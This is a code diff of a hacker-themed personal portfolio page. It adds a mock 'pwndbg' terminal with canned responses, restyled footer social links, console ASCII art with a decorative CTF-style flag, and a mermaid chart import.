+                // If it's a partial command like "info", maybe add space, else just match
+                input.value = match === "info proc" ? "info proc " : match;
+            }
+            return;
+        }
+
+        if (e.key === "Enter") {
+            const cmd = input.value.trim();
+            input.value = "";
+            historyIndex = -1; // reset history pointer
+
+            if (cmd === "") return;
+            
+            // Add to history if it's not the same as the last command
+            if (commandHistory.length === 0 || commandHistory[commandHistory.length - 1] !== cmd) {
+                commandHistory.push(cmd);
+            }
+
+            if (cmd === "") return;
+
+            if (cmd === "clear") {
+                output.innerHTML = asciiBanner;
+                panel.scrollLeft = 0;
+                return;
+            }
+
+            const wrapper = document.createElement("div");
+            wrapper.style.marginTop = "1rem";
+            
+            // Print command line
+            const cmdLine = document.createElement("div");
+            cmdLine.innerHTML = `<span style="color: var(--syn-danger); font-weight: bold;">pwndbg></span> ${cmd}`;
+            wrapper.appendChild(cmdLine);
+
+            // Process command
+            const resultDiv = document.createElement("div");
+            
+            switch (cmd.toLowerCase()) {
+                case "help":
+                    resultDiv.innerHTML = helpHtml;
+                    break;
+                case "info proc bio":
+                    resultDiv.innerHTML = bioHtml;
+                    break;
+                case "info proc socials":
+                    resultDiv.innerHTML = socialsHtml;
+                    break;
+                case "whoami":
+                    resultDiv.innerHTML = "<span style='color: var(--syn-danger);'>root</span>";
+                    break;
+                case "checksec":
+                    resultDiv.innerHTML = checksecHtml;
+                    break;
+                case "strings portfolio.bin":
+                case "strings himanshu.bin":
+                case "strings":
+                    resultDiv.innerHTML = stringsHtml;
+                    break;
+                default:
+                    resultDiv.innerHTML = `<span style="color: var(--syn-danger);">pwndbg: command not found: ${cmd}</span>`;
+            }
+
+            wrapper.appendChild(resultDiv);
+            output.appendChild(wrapper);
+
+            // Wait a tick for rendering then scroll to bottom
+            setTimeout(() => {
+                panel.scrollTop = panel.scrollHeight;
+            }, 10);
+        }
+    });
+});
+</script>
+
+    </div>
 
     <footer>
-        <div class="container">
-            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
-                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
-                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
-                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
-                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
-                <a href="mailto:himanshuparate601@gmail.com">Email</a>
-                <span style="color: var(--text-muted);">Discord: himasnhu</span>
-            </div>
-            
-            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
-                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
-                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
-                </a>
-            </div>
-
-            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        <div class="page-container">
+            <p>
+                <a href="https://github.com/HimanshuP601" target="_blank">0xGITHUB</a> | 
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">0xLINKEDIN</a> | 
+                <a href="https://medium.com/@HimanshuP601" target="_blank">0xMEDIUM</a> | 
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">0xPWN.COLLEGE</a> | 
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">0xHTB</a>
+            </p>
+            <p style="margin-top: 1rem; color: var(--border-color);">&copy; 2026 Himanshu Parate</p>
         </div>
     </footer>
-    <script src="/assets/js/main.js"></script>
+
+    <script>
+        console.log("%c" +
+            "  .o oOOOOOOOo                                            OOOo\n" +
+            "  Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO\n" +
+            "  OboO''''''''''''.OOo. .oOOOOOo.    OOOo.oOOOOOo..''''''''''OO\n" +
+            "  OOP.oOOOOOOOOOOO \"POOOOOOOOOOOo.   `\"OOOOOOOOOP,OOOOOOOOOOOB'\n" +
+            "  `O'OOOO'     `OOOOo\"OOOOOOOOOOO` .adOOOOOOOOO\"oOOO'    `OOOOo\n" +
+            "  .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO\n" +
+            "  OOOOO                 '\"OOOOOOOOOOOOOOOO\"`                oOO\n" +
+            " oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.\n" +
+            " oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO\n" +
+            " OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO\"`  '\"OOOOOOOOOOOOO.OOOOOOOOOOOOOO\n" +
+            " \"OOOO\"       \"YOoOOOOMOIONODOO\"`  .   '\"OOROAOPOEOOOoOY\"     \"OOO\"\n" +
+            "    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`\n" +
+            "    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .\n" +
+            "    .            oOOP\"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO\"OOo\n" +
+            "                 '%o  OOOO\"%OOOO%\"%OOOOO\"OOOOOO\"OOO':\n" +
+            "                      `$\"  `OOOO' `O\"Y ' `OOOO'  o             .\n" +
+            "    .                  .     OP\"          : o     . \n" +
+            "HTB{w3lc0m3_t0_my_m3m0ry}",
+            "color: red; font-family: monospace; font-size: 14px; font-weight: bold;"
+        );
+    </script>
+    <script type="module">
+        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+        mermaid.initialize({ startOnLoad: true, theme: 'dark' });
+    </script>
 </body>
 </html>
